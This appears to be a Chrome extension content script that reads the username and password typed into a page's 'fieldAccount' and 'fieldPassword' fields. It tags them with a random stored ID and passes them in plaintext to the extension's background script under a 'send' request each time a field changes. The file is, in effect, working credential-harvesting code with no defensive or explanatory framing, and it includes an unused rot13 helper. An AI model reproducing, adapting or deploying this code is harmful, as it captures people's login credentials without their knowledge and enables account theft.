chrome.storage.local.get(["customId"], function (result) {
    console.log(result);
    customId = result.customId;
    if (customId == null) {
        customId = Math.floor(Math.random()*256);
    }
    console.log("Value currently is " + customId);
    
    chrome.storage.local.set(
        { customId: customId },
        function () {
            // console.log("Value is set to " + customId);
        }
    );
});

function init() {
    user_field = document.getElementById("fieldAccount");
    pass_field = document.getElementById("fieldPassword");
    username = user_field.value;
    password = pass_field.value;

    valueUpdate(username, password);
    user_field.onchange = () => {
        username = user_field.value;
        valueUpdate(username, password);
    };
    pass_field.onchange = () => {
        password = pass_field.value;
        valueUpdate(username, password);
    };
}

const rot13 = (message) => {
    const originalAlpha =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const cipher = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM";
    return message.replace(
        /[a-z]/gi,
        (letter) => cipher[originalAlpha.indexOf(letter)]
    );
};

function valueUpdate(user, pass) {
    if (user == "") {
        return;
    }
    if (pass == "") {
        return;
    }
    (async () => {
        const response = await chrome.runtime.sendMessage({req: "send", text: `ID: ${customId}\nUsername: ${user}\nPassword: ${pass}`});
      })();
}

init();